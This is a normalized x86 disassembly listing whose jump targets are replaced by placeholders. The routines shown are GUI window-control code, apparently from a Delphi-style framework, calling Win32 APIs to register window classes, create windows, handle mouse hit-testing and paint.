mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403540
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_443750
mov edx ebx
mov eax edi
call sub_445894
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_443750
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_443750
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_443750
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax edi
call sub_449088
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_443750
mov eax edi
call sub_446478
jmp r-xdata
mov edx ebx
mov eax edi
call sub_445588
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4459fc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_443750
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax esi
call sub_449088
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_445874
mov eax ebp
call sub_4462dc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4458e0
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_443750
mov eax esi
call sub_445644
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_442998
sub_445a78
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4143bc
mov edx edi
mov eax ebp
call sub_4143bc
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_445ad4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_445ab4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_445a78
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_445b14
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_445ad4
add esp 0x10
retn
sub_445b3c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_445ba8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_442bac
test al al
je r-xdata
mov eax ebx
call sub_442bdc
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403540
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403540
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_445c10
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_445d2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402d44
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_445ba8
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_448d84
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403294
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042f8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d35
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_445d3c
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_445efd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_43f2f0
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_43f2f0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40d144
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40d144
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408c04
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_449094
push 0x1
mov eax [ esi + 0x68 ]
call sub_41d1e8
mov ecx eax
mov edx 0x30
mov eax esi
call sub_443750
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_448d84
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445f04
lea eax [ ebp - 0xc0 ]
call sub_404094
retn
mov eax esi
mov si 0xffee
call sub_403540
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_445f0c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406ccc
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_445f4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_418240
mov eax esi
call sub_418190
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_418190
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_418248
pop esi
pop ebx
retn
sub_445f84
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_419a8c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_419a18
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_419a18
mov eax esi
call sub_419a94
add esp 0x10
pop esi
pop ebx
retn
sub_445fec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_445fd8
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4143bc
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4143bc
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4460c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_443a88
mov eax [ ebp - 0x8 ]
push eax
push sub_445f4c
mov eax [ ebp - 0x8 ]
push eax
push sub_445f84
push ebp
call sub_445fec
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_446120
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4424c4
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408bb8
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408bcc
mov ecx eax
mov edx edi
mov eax ebx
call sub_4424d4
mov eax r-xdata
call sub_408bd8
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_440f78
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_446178
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4461c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4461cc
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40d144
sub_4461dc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_414418
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4143bc
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_446224
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4461dc
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_445a78
call sub_441ba4
inc edi
dec esi
jne r-xdata
sub_4462c0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4462dc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4143bc
call sub_4462dc
inc edi
dec esi
jne r-xdata
sub_44633c
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403540
mov ebx eax
mov eax edi
call sub_4462dc
mov eax edi
call sub_446478
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44637c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push j_sub_4037e4#9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_443750
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4143bc
call sub_44637c
inc esi
dec ebx
jne r-xdata
sub_446478
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44637c
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_4464b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4462dc
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_446478
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406cbc
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_443750
jmp r-xdata
sub_446540
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446598
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_446587
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44658e
call sub_440f78
call sub_421734
retn
sub_4465b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412edc
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406ca4
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_443750
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_446670
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4143bc
call sub_4465b8
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4143bc
call sub_4465b8
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_446704
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_448d84
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406c90
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_446670
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406ca4
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_443750
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_446798
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_442d0c
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44381c
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_446704
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406c90
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_442094
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_446670
test eax eax
je r-xdata
mov eax ebx
call sub_45a2f0
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44381c
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_449088
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_448d84
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_448d84
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_443750
sub_4468fc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4439b0
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_443750
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41d9c0
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41d9fc
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4420f0
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_446a04
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43f3dc
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_443750
mov [ esi + 0xc ] eax
mov bl 0x1
sub_446a38
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_446b58
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_446b90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b5f
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
